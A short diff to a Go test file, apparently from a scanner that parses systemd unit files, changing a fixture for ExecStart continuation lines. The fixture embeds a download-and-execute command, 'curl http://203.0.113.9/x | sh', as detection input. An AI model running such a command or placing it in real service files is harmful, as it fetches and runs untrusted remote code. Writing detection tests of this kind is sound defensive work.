@@ -23,7 +23,7 @@ func TestLinuxConnFindingBracketsIPv6(t *testing.T) {
 }
 
 func TestUnitExecStartContinuation(t *testing.T) {
-	unit := "[Service]\nExecStart=/bin/true \\\n  ; curl http://203.0.113.9/x | sh\n"
+	unit := "[Service]\nExecStart=/bin/sh -c \\\n  'curl http://203.0.113.9/x | sh'\n"
 	got := parseUnitExecStarts([]byte(unit))
 	if len(got) != 1 || !strings.Contains(got[0], "curl http://203.0.113.9/x | sh") {
 		t.Fatalf("continuation line not joined: %q", got)
